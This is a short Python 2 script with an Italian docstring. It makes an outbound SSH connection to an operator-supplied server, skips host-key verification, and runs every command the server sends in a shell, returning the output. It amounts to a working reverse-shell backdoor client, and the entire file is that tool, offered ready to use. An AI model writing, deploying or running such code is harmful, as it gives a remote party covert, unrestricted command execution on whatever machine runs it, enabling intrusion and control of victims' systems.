''' Client SSH Per Esecuzione Comandi Ricevuti Da Un Server '''

import paramiko
import threading
import subprocess
import sys

def ssh_cmd(addr, port, user, pswd):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(addr, port = port, username=user, password=pswd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send("CoNNeCTeD")
		print "Got: %s \n\n + Starting Commands Executing" % ssh_session.recv(1024)
		while True:
			cmd = ssh_session.recv(1024)
			if cmd == "exit":
				print "+ Exit"
				sys.exit(1)
			try:
				cmd_output = subprocess.check_output(cmd, shell=True)
				if len(cmd_output) == 0:
					cmd_output = "Executed Or Error"
				ssh_session.send(cmd_output)
				ssh_session.send("~|EnD|~")
			except Exception,e:
				ssh_session.send(str(e))
		client.close()
			
	return


if __name__ == "__main__" :
	if(len(sys.argv) == 5):
		addr = sys.argv[1]
		port = int(sys.argv[2])
		username = sys.argv[3]
		password = sys.argv[4]
		ssh_cmd( addr, port, username, password)
	else:
		print"+ Wrong Arguments \n Usage: SSHCmdClient.py address port username password "
	
	
